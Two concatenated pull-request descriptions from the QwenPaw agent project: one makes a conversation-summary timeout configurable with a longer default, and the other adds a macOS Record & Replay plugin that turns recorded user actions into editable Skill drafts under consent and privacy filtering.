Make Scroll's continuation-summary timeout configurable with `running.light_context_config.scroll_config.summary_timeout_seconds`, and increase the default from 60 to 300 seconds for slow reasoning models. Both normal agent construction and standalone `/compact` forward the configured timeout. The finite positive budget covers preparation, generation, validation and a quality retry; retries share the remaining time. Existing cancellation and previous-summary preservation behavior remain in place. Update English and Chinese configuration documentation.

**Related Issue:** Relates to #8464; addresses the two follow-up problems in https://github.com/agentscope-ai/QwenPaw/issues/8464#issuecomment-6469428885. Conversation-model selection is handled separately by #8465.

prs.body:
## Description

Adds a bundled Record & Replay plugin for QwenPaw Desktop on macOS 14+. The plugin records a minimized semantic event stream, lets the user review and select local evidence, previews the exact model payload, requires one-time consent, generates an editable Skill draft, and materializes the approved Skill into the active Agent workspace. Later execution uses the normal Skill/tool path and the optional Computer Use plugin; there is no Record-specific replay engine or DSL.

The implementation keeps one existing **QwenPaw Computer Use.app** Helper and adds a versioned `event_stream` contract beside the existing `computer_use` contract. The plugin owns UI, API, recording/learning services, consent, and workspace persistence. HostRuntime owns authenticated Helper discovery and launch. The Helper owns TCC permissions, capture-time privacy filtering, process-wide device coordination, the visible recording indicator and emergency stop, and short-lived sealed staging artifacts. No second Helper, plugin-owned secret, Python-to-Rust callback channel, or runtime code signing is introduced.

The final scope is one complete feature commit rebased onto `upstream/main@dbff215b5`. Experimental probes, validation transcripts, unused frame schema, migration-only routes, and unrelated runtime/build changes from development were removed. Stable architecture and security invariants are documented in `docs/design/record-and-replay.md`.

**Related Issue:** N/A

**Security Considerations:** Capture is events-only. Raw key text, clipboard/content values, secure-field labels, sensitive titles, excluded applications, absolute coordinates, local paths, and screenshots are excluded before durable import or model transfer. Native minimization and Python import validation are separate trust boundaries. Staging is owner-only, reference-scoped, sealed before import, TTL-limited, and explicitly released.
